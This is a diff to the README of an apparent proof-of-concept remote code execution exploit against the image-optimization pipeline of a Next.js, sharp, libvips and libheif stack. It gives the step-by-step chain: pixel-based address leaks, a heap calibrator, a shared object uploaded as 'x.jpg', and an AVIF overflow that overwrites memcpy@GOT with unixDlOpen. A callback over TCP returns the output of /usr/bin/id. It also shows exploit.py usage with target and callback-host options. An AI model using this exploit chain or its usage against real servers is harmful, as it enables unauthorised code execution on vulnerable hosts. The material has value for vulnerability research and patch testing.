@@ -15,20 +15,23 @@ The exploit uses only the target's HTTP upload and image-optimization routes:
    pixels with every exact libvips profile in the manifest.
 2. It proceeds only when one profile and one randomized libvips base are
    supported by all required independent anchors.
-3. It then uploads a callback shared object under the image-looking name
+3. It scans those same pixels for a complete heap record tied to the recovered
+   libvips base. The record must contain repeated peer pointers, an arena
+   sentinel, three libvips references and a bounded related-pointer delta.
+4. It then uploads a callback shared object under the image-looking name
    `x.jpg`.
-4. It generates a 116x33 four-tile AVIF whose Cb overflow redirects the Cr
+5. It generates a 116x33 four-tile AVIF whose Cb overflow redirects the Cr
    plane to `memcpy@GOT - 16`.
-5. The first chosen-address row replaces `memcpy@GOT` with Node's fixed
+6. The first chosen-address row replaces `memcpy@GOT` with Node's fixed
    `unixDlOpen`; the next row supplies `uploads/x.jpg` in RSI.
-6. Loading the staged shared object runs the fixed command `/usr/bin/id` and
+7. Loading the staged shared object runs the fixed command `/usr/bin/id` and
    returns its output over TCP. An internal per-attempt identifier prevents a
    stale or unrelated callback from being counted as success; it is not the
    command-execution proof.
 
-The final validation cohort succeeded in 10/10 fresh processes with ten
-different ASLR bases. See
-[`evidence/profile-classifier-rce-10x.json`](evidence/profile-classifier-rce-10x.json).
+The heap-calibrated validation cohort succeeded in 10/10 fresh processes with
+ten different ASLR bases. See
+[`evidence/heap-calibrated-rce-10x.json`](evidence/heap-calibrated-rce-10x.json).
 
 ## Tested stack
 
@@ -39,11 +42,12 @@ different ASLR bases. See
 - bundled libheif 1.20.2
 - Linux x86-64 with ASLR and NX enabled
 
-The Node helper address, libvips relocation offset and partial-pointer layout
-are build-specific. They now live in a strict, versioned native-stack profile
-rather than in the exploit source. This repository fails closed when a profile
-is malformed or when returned pixels do not select exactly one supported
-profile/base pair.
+The Node helper address, libvips relocation offset and heap relationships are
+build-specific. They live in a strict, versioned native-stack profile rather
+than in the exploit source. The profile no longer contains a fixed fake-node
+low word. This repository fails closed when a profile is malformed, returned
+pixels do not select exactly one supported profile/base pair, or heap evidence
+does not produce one structurally supported selector.
 
 ## Requirements
 
@@ -115,7 +119,7 @@ by default:
 python3 exploit.py \
   --target https://authorised-target.example \
   --callback-host 203.0.113.10 \
-  --callback-port 33333 \
+  --callback-port 31337 \
   --json-output result.json
 ```
 
@@ -126,6 +130,24 @@ A successful result contains:
   "success": true,
   "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
   "libvips_base": "0x7f1234400000",
+  "heap_calibration": {
+    "derived_selector": "0x5970",
+    "minimum_observations": 1,
+    "observations": [
+      {
+        "response_sha256": "...",
+        "candidate_selectors": ["0x5970"],
+        "matches": [
+          {
+            "anchor": "0x7f00104f6e30",
+            "anchor_page": "0x7f00104f6000",
+            "fake_node_delta_from_anchor_page": "-0x690",
+            "derived_fake_node": "0x7f00104f5970"
+          }
+        ]
+      }
+    ]
+  },
   "classification": {
     "selected_attempt": 4,
     "selected_profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
@@ -160,9 +182,9 @@ for context but are not success conditions.
 ```text
 --target URL              Target base URL (required)
 --callback-host IPV4      Address embedded in the uploaded library (required)
---callback-port PORT      Callback and listener port (default: 33333)
+--callback-port PORT      Callback and listener port (default: 31337)
 --listen-host IPV4        Local bind address (default: 0.0.0.0)
---leak-attempts N         Maximum donor requests (default: 16)
+--leak-attempts N         Maximum donor requests (default: 64)
 --callback-timeout SEC    Listener timeout (default: 12)
 --trigger-timeout SEC     Optimizer request timeout (default: 20)
 --profile-manifest FILE   Profile manifest (default: repository manifest)
@@ -183,8 +205,8 @@ satisfies the pinned profile's 16-byte constraint.
 binds one exploit layout to exact artifacts and ABI measurements. The pinned
 profile identifies Node, Next.js, sharp, libvips, libheif, glibc and
 libstdc++, then records the loader helper, GOT relocation, returned-pointer
-anchors, forged red-black-tree/ImagePlane layout, heap selector, tile geometry
-and application paths.
+anchors, forged red-black-tree/ImagePlane layout, heap-record relation, tile
+geometry and application paths.
 
 The runtime loader rejects unknown or missing fields, malformed numbers and
 digests, unsafe paths, and inconsistent geometry before making an HTTP request.
@@ -211,8 +233,22 @@ that repeated values cannot replace independent anchors.
 
 Successful JSON output records the selecting response attempt, selected
 profile and base, each anchor value and repetition count, and every rejected
-candidate. Earlier no-match attempts remain in the `classification.attempts`
+candidate. It also records each heap response hash, matching response offset,
+arena sentinel, heap pointers, libvips references, signed relation and derived
+selector. Earlier no-match attempts remain in the `classification.attempts`
 array for auditability.
+
+The heap calibrator does not trust a raw low word. A candidate must be inside
+a complete returned record containing the expected heap chunk size, a 64 MiB
+arena sentinel, paired heap pointers, three pointers relative to the already
+recovered libvips base and the declared marker. The profile selects the lowest
+complete record, normalises the selected anchor to its page, and applies the
+signed page-to-fake-node relation. This removes harmless sub-page allocator
+shifts from the calculation. The record itself supplies repeated heap-pointer
+observations and three independent libvips-relative checks. If no complete
+record exists, or multiple derived values independently reach the configured
+threshold, the exploit stops before it uploads either the callback library or
+the destructive AVIF.
 
 Verify a local stack against every declared identity before using its profile:
 
@@ -245,6 +281,7 @@ python3 scripts/fresh_process_cohort.py --lifetimes 10
 ```text
 exploit.py                         remote orchestrator and callback verifier
 profile_classifier.py              pure returned-pixel profile/base classifier
+heap_calibrator.py                  repeated returned-pixel heap calibration
 rce_payload.py                     proven memcpy-GOT AVIF payload
 stack_profile.py                   strict native-stack profile loader
 profiles/native_stack_profiles.json exact supported artifact and ABI identity
@@ -270,8 +307,8 @@ vtable and rb-tree-GOT experiments were intentionally excluded.
   validation, generated storage names, or an upload directory outside the
   application working directory can break the staging step.
 - The fixed Node and libvips offsets apply only to the tested binaries.
-- The low-16-bit plane-map redirection depends on the measured pinned sharp
-  worker layout.
+- The low-16-bit plane-map redirection depends on a profile-specific returned
+  heap-record shape and anchor-page-to-fake-node relation.
 - The PoC proves native execution by returning `/usr/bin/id` output; it does
   not provide an arbitrary command interface or attempt to keep the corrupted
   target process alive.
